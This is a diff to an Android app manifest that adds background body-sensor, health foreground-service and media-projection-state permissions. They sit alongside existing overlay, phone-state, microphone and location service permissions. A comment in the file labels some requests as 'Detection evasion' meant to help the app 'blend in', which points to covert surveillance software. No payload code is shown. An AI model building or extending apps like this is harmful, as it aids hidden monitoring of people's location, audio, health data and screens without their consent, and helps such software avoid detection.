@@ -20,12 +20,17 @@
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     
-    <!-- Android 14+ media permissions -->
+    <!-- Android 13+ media permissions -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    
+    <!-- Android 14+ visual media permissions -->
     <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
+    
+    <!-- Android 15+ health and fitness permissions -->
+    <uses-permission android:name="android.permission.BODY_SENSORS_BACKGROUND" />
     
     <!-- Android 12+ background services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -33,9 +38,13 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_HEALTH" />
     
     <!-- Android 14+ notification permissions -->
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    
+    <!-- Android 15+ partial screen sharing -->
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_PROJECTION_STATE" />
     
     <!-- Detection evasion: Request normal app permissions to blend in -->
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
